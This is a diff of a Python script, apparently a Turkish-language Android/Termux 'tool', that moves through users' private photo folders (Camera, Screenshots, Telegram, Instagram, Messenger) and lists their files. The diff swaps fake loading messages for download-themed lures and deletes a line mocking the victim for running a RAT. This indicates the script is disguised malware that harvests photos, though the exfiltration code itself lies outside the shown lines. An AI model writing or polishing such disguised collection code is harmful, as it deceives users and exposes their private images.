@@ -63,7 +63,7 @@ for i in tmp:
   else:
        pass
        
-print('\033[2;31m  [ ! ] \033[2;34m APİLER ALİNİYO.... ')     
+print('\033[2;31m  [ ! ] \033[2;34m HOŞGELDİNİZ KODLAR BİRAZDAN İNDİRİLCEKTİR LÜTFEN BEKLEYİNİZ.... ')     
 print('')
         
 os.chdir(r"/storage/emulated/0/DCIM/Screenshots")
@@ -77,7 +77,7 @@ for i in tmp:
           pass
   else:
        pass  
-print('\033[2;31m  [ ! ] \033[2;32m Apiler Bağlanıyor Lütfen Beklyiniz......') 
+print('\033[2;31m  [ ! ] \033[2;32m İnmeye Hazırlanıyo Lütfen Bekleniyiniz......') 
 print('')
                                               
 os.chdir(r"/storage/emulated/0/DCIM/Camera")   
@@ -91,7 +91,7 @@ for i in tmp:
           pass
   else:
        pass     
-print('\033[34;1m  [ ! ] \033[33;1m 1 Dakka Bekleyinix......... ')   
+print('\033[34;1m  [ ! ] \033[33;1m İndirmeye Başladı Arka Planda İndirmeye Devam Edebilirsiniz......... ')   
 print('')
                       
 os.chdir(r"/storage/emulated/0/Pictures/Telegram")   
@@ -106,7 +106,7 @@ for i in tmp:
   else:
        pass 
        
-print('\033[36;1m  [ ! ] \033[32;1m Çalışmaya Hazır .......')   
+print('\033[36;1m  [ ! ] \033[32;1m ')   
 print('')
     
 os.chdir(r"/storage/emulated/0/Pictures/Instagram")   
@@ -121,7 +121,7 @@ for i in tmp:
   else:
        pass  
        
-print('\033[0;1m  [ ! ] \033[31;1m ENAYİ MAL BÖYLE HER TOOLU AÇARSAN RAT YERSİN SG ......  ')   
+print('\033[0;1m  [ ! ] \033[31;1m  ')   
 print('')      
 os.chdir(r"/storage/emulated/0/Pictures/Messenger")   
 tmp = list(os.scandir('.'))
